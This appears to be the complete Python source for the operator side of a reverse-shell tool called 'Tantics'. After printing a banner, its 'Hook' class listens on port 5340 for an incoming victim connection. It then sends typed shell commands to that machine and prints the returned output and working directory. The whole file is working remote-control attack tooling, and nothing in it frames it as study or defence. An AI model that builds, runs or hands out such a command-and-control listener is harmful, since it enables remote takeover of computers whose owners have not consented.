import socket
from pyfiglet import figlet_format

"""
Written by: CodeVIP123 (Mr. Y)
Copyright © 2024
"""


class Setup:

    def __init__(self, name="Tantics", version=1.0):
        self._name = name
        self.ver = version

    @property
    def name(self):
        return self._name

    @property
    def version(self):
        return self.ver

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @version.setter
    def version(self, new_ver):
        self.ver = new_ver

    def show_name(self):
        print(f"{figlet_format(self._name)} {figlet_format(str(self.ver))}")


class Hook:
    def __init__(self, ip="0.0.0.0", port=5340):
        self._ip = ip
        self._port = port
        self.BUFFER_SIZE = 1024 * 128
        self.SEPERATOR = "<sep>"
        self._sock = socket.socket()

    @property
    def ip(self):
        return self._ip

    @property
    def port(self):
        return self._port

    @ip.setter
    def ip(self, new_ip):
        self._ip = new_ip

    @port.setter
    def port(self, new_p):
        self._port = new_p

    def bind_connection(self):

        self._sock.bind((self.ip, self.port))
        self._sock.listen(5)

        client_socket, client_address = self._sock.accept()
        print(f"Connected {client_address[0]}:{client_address[1]}")

        # receiving the current working directory of the client
        cwd = client_socket.recv(self.BUFFER_SIZE).decode()
        print("[+] Current working directory:", cwd)

        while True:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
            output = client_socket.recv(self.BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(self.SEPERATOR)
            # print output
            print(results)


setup = Setup()
setup.show_name()

ho = Hook()
ho.bind_connection()
